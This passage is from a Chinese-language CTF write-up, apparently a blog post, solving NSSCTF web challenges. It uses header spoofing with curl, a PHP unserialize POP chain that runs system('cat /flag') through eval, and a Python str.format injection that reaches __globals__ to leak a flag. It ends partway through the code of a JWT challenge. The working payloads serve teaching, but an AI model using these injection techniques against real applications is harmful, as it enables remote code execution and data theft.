<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl -X HS -H &#x27;X-Forwarded-For: 127.0.0.1&#x27; http://node5.anna.nssctf.cn:28687/ -v</span><br><span class="line"><span class="bullet">*</span> Host node5.anna.nssctf.cn:28687 was resolved.</span><br><span class="line"><span class="bullet">*</span> IPv6: (none)</span><br><span class="line"><span class="bullet">*</span> IPv4: 118.195.175.220</span><br><span class="line"><span class="bullet">*</span>   Trying 118.195.175.220:28687...</span><br><span class="line"><span class="bullet">*</span> Connected to node5.anna.nssctf.cn (118.195.175.220) port 28687</span><br><span class="line"><span class="bullet">*</span> using HTTP/1.x</span><br><span class="line"><span class="quote">&gt; HS / HTTP/1.1</span></span><br><span class="line"><span class="quote">&gt; Host: node5.anna.nssctf.cn:28687</span></span><br><span class="line"><span class="quote">&gt; User-Agent: curl/8.11.1</span></span><br><span class="line"><span class="quote">&gt; Accept: <span class="emphasis">*/*</span></span></span><br><span class="line"><span class="quote">&gt; X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">* Request completely sent off</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sat, 22 Feb 2025 15:54:59 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.2.34</span><br><span class="line">&lt; Content-Length: 47</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">æˆ‘å¸Œæœ›ä½ æ˜¯ä»&#x27;www.ltyyds.com&#x27;è¿‡æ¥çš„ï¼</span><br><span class="line"><span class="bullet">*</span> Connection #0 to host node5.anna.nssctf.cn left intact</span><br></pre></td></tr></table></figure></div>
<p>ä»å“ªé‡Œæ¥å°±æ˜¯è¦ä¿®æ”¹Referer</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl -X HS -H &#x27;X-Forwarded-For: 127.0.0.1&#x27; -H &#x27;Referer: www.ltyyds.com&#x27; http://node5.anna.nssctf.cn:28687/ -v</span><br><span class="line"><span class="bullet">*</span> Host node5.anna.nssctf.cn:28687 was resolved.</span><br><span class="line"><span class="bullet">*</span> IPv6: (none)</span><br><span class="line"><span class="bullet">*</span> IPv4: 118.195.175.220</span><br><span class="line"><span class="bullet">*</span>   Trying 118.195.175.220:28687...</span><br><span class="line"><span class="bullet">*</span> Connected to node5.anna.nssctf.cn (118.195.175.220) port 28687</span><br><span class="line"><span class="bullet">*</span> using HTTP/1.x</span><br><span class="line"><span class="quote">&gt; HS / HTTP/1.1</span></span><br><span class="line"><span class="quote">&gt; Host: node5.anna.nssctf.cn:28687</span></span><br><span class="line"><span class="quote">&gt; User-Agent: curl/8.11.1</span></span><br><span class="line"><span class="quote">&gt; Accept: <span class="emphasis">*/*</span></span></span><br><span class="line"><span class="quote">&gt; X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="quote">&gt; Referer: www.ltyyds.com</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">* Request completely sent off</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sat, 22 Feb 2025 15:56:50 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.2.34</span><br><span class="line">&lt; Vary: Accept-Encoding</span><br><span class="line">&lt; Content-Length: 85</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line">&#x27;LT&#x27;æ‰æ˜¯æœ¬é¢˜å®˜æ–¹æµè§ˆå™¨å“¦ï¼</span><br><span class="line">æƒ³è¦å¾—åˆ°flagï¼Œå°±ç”¨å®˜æ–¹æµè§ˆå™¨å§ï¼</span><br><span class="line"><span class="bullet">*</span> Connection #0 to host node5.anna.nssctf.cn left intact</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æŒ‡å®šæµè§ˆå™¨å°±æ˜¯ä¿®æ”¹UAå¤´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl -X HS -H &#x27;X-Forwarded-For: 127.0.0.1&#x27; -H &#x27;Referer: www.ltyyds.com&#x27; -H &#x27;User-Agent: LT&#x27; http://node5.anna.nssctf.cn:28687/ -v</span><br><span class="line"><span class="bullet">*</span> Host node5.anna.nssctf.cn:28687 was resolved.</span><br><span class="line"><span class="bullet">*</span> IPv6: (none)</span><br><span class="line"><span class="bullet">*</span> IPv4: 118.195.175.220</span><br><span class="line"><span class="bullet">*</span>   Trying 118.195.175.220:28687...</span><br><span class="line"><span class="bullet">*</span> Connected to node5.anna.nssctf.cn (118.195.175.220) port 28687</span><br><span class="line"><span class="bullet">*</span> using HTTP/1.x</span><br><span class="line"><span class="quote">&gt; HS / HTTP/1.1</span></span><br><span class="line"><span class="quote">&gt; Host: node5.anna.nssctf.cn:28687</span></span><br><span class="line"><span class="quote">&gt; Accept: <span class="emphasis">*/*</span></span></span><br><span class="line"><span class="quote">&gt; X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="quote">&gt; Referer: www.ltyyds.com</span></span><br><span class="line"><span class="quote">&gt; User-Agent: LT</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">* Request completely sent off</span></span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Sat, 22 Feb 2025 15:57:44 GMT</span><br><span class="line">&lt; Server: Apache/2.4.38 (Debian)</span><br><span class="line">&lt; X-Powered-By: PHP/7.2.34</span><br><span class="line">&lt; Content-Length: 44</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; </span><br><span class="line"><span class="bullet">*</span> Connection #0 to host node5.anna.nssctf.cn left intact</span><br><span class="line">NSSCTF&#123;f20b6126-a90b-42dd-b586-fab1854476ae&#125;     </span><br></pre></td></tr></table></figure></div>
<h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œè¦æ‰¾popé“¾<br>æœ€åæˆ‘ä»¬æƒ³è¦ç”¨çš„æ˜¯<code>evil</code>ç±»ä¸­çš„__getå‡½æ•°çš„evalï¼Œ<code>$this-&gt;end</code>å°±æ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤<br>å½“ä½ è¯•å›¾è®¿é—®ä¸€ä¸ª<strong>ä¸å­˜åœ¨</strong>æˆ–<strong>ä¸å¯è®¿é—®</strong>ï¼ˆå¦‚ <code>private</code>ï¼‰çš„å±æ€§æ—¶ï¼Œ<code>__get()</code> æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚<br>èƒ½å¤Ÿå‡ºå‘è¿™ä¸ª__getå‡½æ•°æ˜¯<code>springboard</code> ä¸­çš„__callå‡½æ•°ï¼Œè¿™é‡Œæ‰§è¡Œä¼š<code>echo $this-&gt;middle-&gt;hs;1</code><br>å°±è®©è¿™é‡Œechoä¸€ä¸ªevilä¸å­˜åœ¨çš„å±æ€§å°±èƒ½è§¦å‘<br>__callæ€ä¹ˆè§¦å‘     åœ¨ PHP ä¸­ï¼Œ<code>__call()</code> æ˜¯ä¸€ä¸ª <strong>é­”æ³•æ–¹æ³•</strong>ï¼Œå½“è°ƒç”¨<strong>æœªå®šä¹‰</strong>æˆ–<strong>ä¸å¯è®¿é—®</strong>ï¼ˆå¦‚ <code>private</code>ï¼‰çš„æ–¹æ³•æ—¶ï¼Œå®ƒä¼šè¢«è‡ªåŠ¨è§¦å‘ã€‚<br>æ‰€ä»¥ç”¨<code>entrance</code>ç±»ä¸­çš„<code>$this-&gt;start-&gt;helloworld();</code> è®©<code>$this -&gt; start</code> ä¸ºspringboardè¿™æ ·å°±èƒ½è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•<br>payload:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">entrance</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">springboard</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; start = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; middle = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; end = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">8</span>:<span class="string">&quot;entrance&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;O:<span class="number">11</span>:<span class="string">&quot;springboard&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;middle&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b9f71cd0e0a243d40237ea.png"></p>
<h1 id="åœ°ç‹±é€šè®¯"><a href="#åœ°ç‹±é€šè®¯" class="headerlink" title="åœ°ç‹±é€šè®¯"></a>åœ°ç‹±é€šè®¯</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, FLAG</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    ctx = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    f1ag = request.args.get(<span class="string">&#x27;f1ag&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    exp = request.args.get(<span class="string">&#x27;exp&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    flAg = FLAG(f1ag)</span><br><span class="line">    message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + exp</span><br><span class="line">    <span class="keyword">if</span> exp == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> ctx</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> message.<span class="built_in">format</span>(flAg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªæ˜¯ç”¨pythonçš„flaskæ„é€ ä¸€ä¸ªwebç•Œé¢çš„æºç <br>f1agå’Œexpéƒ½æ˜¯é€šè¿‡getè¯·æ±‚ä¼ é€’ï¼Œè¿™é‡Œæœ€åè¿”å›çš„æ—¶å€™ç”¨formatæŠŠflAgæ”¾åœ¨messageä¸­çš„{0}ä½ç½®<br>æ‰€ä»¥å¦‚æœexpä¸­ä¹Ÿæœ‰{0}å°±å¯ä»¥è®¿é—®åˆ°FLAG<br>åœ¨pythonä¸­<br><strong>class</strong> è·å–å¯¹è±¡çš„ç±»ã€‚<br><strong>init</strong> è·å–ç±»çš„æ„é€ æ–¹æ³•ã€‚<br><strong>globals</strong> è·å–è¯¥ç±»å®šä¹‰æ—¶çš„å…¨å±€å˜é‡ã€‚<br>payloadä¸º<code>?flag=1&amp;exp=&#123;0.__class__.__init__.__globals__&#125;</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">Your flag is &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: None, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader object at <span class="number">0</span>x7fc8364bbb10&gt;, <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;flag&#x27;</span>, loader=&lt;_frozen_importlib_external.SourceFileLoader object at <span class="number">0</span>x7fc8364bbb10&gt;, origin=<span class="string">&#x27;/var/www/html/flag.py&#x27;</span>), <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;/var/www/html/flag.py&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>: <span class="string">&#x27;/var/www/html/__pycache__/flag.cpython-311.pyc&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>: &#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="string">&quot;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#x27; object; Ellipsis represents `...&#x27; in slices.&quot;</span>, <span class="string">&#x27;__package__&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>: , <span class="string">&#x27;__spec__&#x27;</span>: ModuleSpec(name=<span class="string">&#x27;builtins&#x27;</span>, loader=, origin=<span class="string">&#x27;built-in&#x27;</span>), <span class="string">&#x27;__build_class__&#x27;</span>: , <span class="string">&#x27;__import__&#x27;</span>: , <span class="string">&#x27;abs&#x27;</span>: , <span class="string">&#x27;all&#x27;</span>: , <span class="string">&#x27;any&#x27;</span>: , <span class="string">&#x27;ascii&#x27;</span>: , <span class="string">&#x27;bin&#x27;</span>: , <span class="string">&#x27;breakpoint&#x27;</span>: , <span class="string">&#x27;callable&#x27;</span>: , <span class="string">&#x27;chr&#x27;</span>: , <span class="string">&#x27;compile&#x27;</span>: , <span class="string">&#x27;delattr&#x27;</span>: , <span class="string">&#x27;dir&#x27;</span>: , <span class="string">&#x27;divmod&#x27;</span>: , <span class="string">&#x27;eval&#x27;</span>: , <span class="string">&#x27;exec&#x27;</span>: , <span class="string">&#x27;format&#x27;</span>: , <span class="string">&#x27;getattr&#x27;</span>: , <span class="string">&#x27;globals&#x27;</span>: , <span class="string">&#x27;hasattr&#x27;</span>: , <span class="string">&#x27;hash&#x27;</span>: , <span class="string">&#x27;hex&#x27;</span>: , <span class="string">&#x27;id&#x27;</span>: , <span class="string">&#x27;input&#x27;</span>: , <span class="string">&#x27;isinstance&#x27;</span>: , <span class="string">&#x27;issubclass&#x27;</span>: , <span class="string">&#x27;iter&#x27;</span>: , <span class="string">&#x27;aiter&#x27;</span>: , <span class="string">&#x27;len&#x27;</span>: , <span class="string">&#x27;locals&#x27;</span>: , <span class="string">&#x27;max&#x27;</span>: , <span class="string">&#x27;min&#x27;</span>: , <span class="string">&#x27;next&#x27;</span>: , <span class="string">&#x27;anext&#x27;</span>: , <span class="string">&#x27;oct&#x27;</span>: , <span class="string">&#x27;ord&#x27;</span>: , <span class="string">&#x27;pow&#x27;</span>: , <span class="string">&#x27;print&#x27;</span>: , <span class="string">&#x27;repr&#x27;</span>: , <span class="string">&#x27;round&#x27;</span>: , <span class="string">&#x27;setattr&#x27;</span>: , <span class="string">&#x27;sorted&#x27;</span>: , <span class="string">&#x27;sum&#x27;</span>: , <span class="string">&#x27;vars&#x27;</span>: , <span class="string">&#x27;None&#x27;</span>: None, <span class="string">&#x27;Ellipsis&#x27;</span>: Ellipsis, <span class="string">&#x27;NotImplemented&#x27;</span>: NotImplemented, <span class="string">&#x27;False&#x27;</span>: False, <span class="string">&#x27;True&#x27;</span>: True, <span class="string">&#x27;bool&#x27;</span>: , <span class="string">&#x27;memoryview&#x27;</span>: , <span class="string">&#x27;bytearray&#x27;</span>: , <span class="string">&#x27;bytes&#x27;</span>: , <span class="string">&#x27;classmethod&#x27;</span>: , <span class="string">&#x27;complex&#x27;</span>: , <span class="string">&#x27;dict&#x27;</span>: , <span class="string">&#x27;enumerate&#x27;</span>: , <span class="string">&#x27;filter&#x27;</span>: , <span class="string">&#x27;float&#x27;</span>: , <span class="string">&#x27;frozenset&#x27;</span>: , <span class="string">&#x27;property&#x27;</span>: , <span class="string">&#x27;int&#x27;</span>: , <span class="string">&#x27;list&#x27;</span>: , <span class="string">&#x27;map&#x27;</span>: , <span class="string">&#x27;object&#x27;</span>: , <span class="string">&#x27;range&#x27;</span>: , <span class="string">&#x27;reversed&#x27;</span>: , <span class="string">&#x27;set&#x27;</span>: , <span class="string">&#x27;slice&#x27;</span>: , <span class="string">&#x27;staticmethod&#x27;</span>: , <span class="string">&#x27;str&#x27;</span>: , <span class="string">&#x27;super&#x27;</span>: , <span class="string">&#x27;tuple&#x27;</span>: , <span class="string">&#x27;type&#x27;</span>: , <span class="string">&#x27;zip&#x27;</span>: , <span class="string">&#x27;__debug__&#x27;</span>: True, <span class="string">&#x27;BaseException&#x27;</span>: , <span class="string">&#x27;BaseExceptionGroup&#x27;</span>: , <span class="string">&#x27;Exception&#x27;</span>: , <span class="string">&#x27;GeneratorExit&#x27;</span>: , <span class="string">&#x27;KeyboardInterrupt&#x27;</span>: , <span class="string">&#x27;SystemExit&#x27;</span>: , <span class="string">&#x27;ArithmeticError&#x27;</span>: , <span class="string">&#x27;AssertionError&#x27;</span>: , <span class="string">&#x27;AttributeError&#x27;</span>: , <span class="string">&#x27;BufferError&#x27;</span>: , <span class="string">&#x27;EOFError&#x27;</span>: , <span class="string">&#x27;ImportError&#x27;</span>: , <span class="string">&#x27;LookupError&#x27;</span>: , <span class="string">&#x27;MemoryError&#x27;</span>: , <span class="string">&#x27;NameError&#x27;</span>: , <span class="string">&#x27;OSError&#x27;</span>: , <span class="string">&#x27;ReferenceError&#x27;</span>: , <span class="string">&#x27;RuntimeError&#x27;</span>: , <span class="string">&#x27;StopAsyncIteration&#x27;</span>: , <span class="string">&#x27;StopIteration&#x27;</span>: , <span class="string">&#x27;SyntaxError&#x27;</span>: , <span class="string">&#x27;SystemError&#x27;</span>: , <span class="string">&#x27;TypeError&#x27;</span>: , <span class="string">&#x27;ValueError&#x27;</span>: , <span class="string">&#x27;Warning&#x27;</span>: , <span class="string">&#x27;FloatingPointError&#x27;</span>: , <span class="string">&#x27;OverflowError&#x27;</span>: , <span class="string">&#x27;ZeroDivisionError&#x27;</span>: , <span class="string">&#x27;BytesWarning&#x27;</span>: , <span class="string">&#x27;DeprecationWarning&#x27;</span>: , <span class="string">&#x27;EncodingWarning&#x27;</span>: , <span class="string">&#x27;FutureWarning&#x27;</span>: , <span class="string">&#x27;ImportWarning&#x27;</span>: , <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>: , <span class="string">&#x27;ResourceWarning&#x27;</span>: , <span class="string">&#x27;RuntimeWarning&#x27;</span>: , <span class="string">&#x27;SyntaxWarning&#x27;</span>: , <span class="string">&#x27;UnicodeWarning&#x27;</span>: , <span class="string">&#x27;UserWarning&#x27;</span>: , <span class="string">&#x27;BlockingIOError&#x27;</span>: , <span class="string">&#x27;ChildProcessError&#x27;</span>: , <span class="string">&#x27;ConnectionError&#x27;</span>: , <span class="string">&#x27;FileExistsError&#x27;</span>: , <span class="string">&#x27;FileNotFoundError&#x27;</span>: , <span class="string">&#x27;InterruptedError&#x27;</span>: , <span class="string">&#x27;IsADirectoryError&#x27;</span>: , <span class="string">&#x27;NotADirectoryError&#x27;</span>: , <span class="string">&#x27;PermissionError&#x27;</span>: , <span class="string">&#x27;ProcessLookupError&#x27;</span>: , <span class="string">&#x27;TimeoutError&#x27;</span>: , <span class="string">&#x27;IndentationError&#x27;</span>: , <span class="string">&#x27;IndexError&#x27;</span>: , <span class="string">&#x27;KeyError&#x27;</span>: , <span class="string">&#x27;ModuleNotFoundError&#x27;</span>: , <span class="string">&#x27;NotImplementedError&#x27;</span>: , <span class="string">&#x27;RecursionError&#x27;</span>: , <span class="string">&#x27;UnboundLocalError&#x27;</span>: , <span class="string">&#x27;UnicodeError&#x27;</span>: , <span class="string">&#x27;BrokenPipeError&#x27;</span>: , <span class="string">&#x27;ConnectionAbortedError&#x27;</span>: , <span class="string">&#x27;ConnectionRefusedError&#x27;</span>: , <span class="string">&#x27;ConnectionResetError&#x27;</span>: , <span class="string">&#x27;TabError&#x27;</span>: , <span class="string">&#x27;UnicodeDecodeError&#x27;</span>: , <span class="string">&#x27;UnicodeEncodeError&#x27;</span>: , <span class="string">&#x27;UnicodeTranslateError&#x27;</span>: , <span class="string">&#x27;ExceptionGroup&#x27;</span>: , <span class="string">&#x27;EnvironmentError&#x27;</span>: , <span class="string">&#x27;IOError&#x27;</span>: , <span class="string">&#x27;open&#x27;</span>: , <span class="string">&#x27;quit&#x27;</span>: Use quit() or Ctrl-D (i.e. EOF) to <span class="keyword">exit</span>, <span class="string">&#x27;exit&#x27;</span>: Use <span class="keyword">exit</span>() or Ctrl-D (i.e. EOF) to <span class="keyword">exit</span>, <span class="string">&#x27;copyright&#x27;</span>: Copyright (c) <span class="number">2001</span>-<span class="number">2022</span> Python Software Foundation. All Rights Reserved. Copyright (c) <span class="number">2000</span> BeOpen.com. All Rights Reserved. Copyright (c) <span class="number">1995</span>-<span class="number">2001</span> Corporation <span class="keyword">for</span> National Research Initiatives. All Rights Reserved. Copyright (c) <span class="number">1991</span>-<span class="number">1995</span> Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., <span class="string">&#x27;credits&#x27;</span>: Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands <span class="keyword">for</span> supporting Python development. See www.python.org <span class="keyword">for</span> more information., <span class="string">&#x27;license&#x27;</span>: Type license() to see the full license text, <span class="string">&#x27;help&#x27;</span>: Type help() <span class="keyword">for</span> interactive help, or help(object) <span class="keyword">for</span> help about object.&#125;, <span class="string">&#x27;os&#x27;</span>: , <span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;NSSCTF&#123;d49ac46c-0a9a-4a13-9c83-5a0fa1d8111c&#125;&#x27;</span>, <span class="string">&#x27;FLAG&#x27;</span>: &#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="åœ°ç‹±é€šè®¯-æ”¹"><a href="#åœ°ç‹±é€šè®¯-æ”¹" class="headerlink" title="åœ°ç‹±é€šè®¯ - æ”¹"></a>åœ°ç‹±é€šè®¯ - æ”¹</h1><p>é¢˜ç›®ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, session, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret, headers, User</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    ctx = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    res = make_response(ctx)</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    payload = &#123;</span><br><span 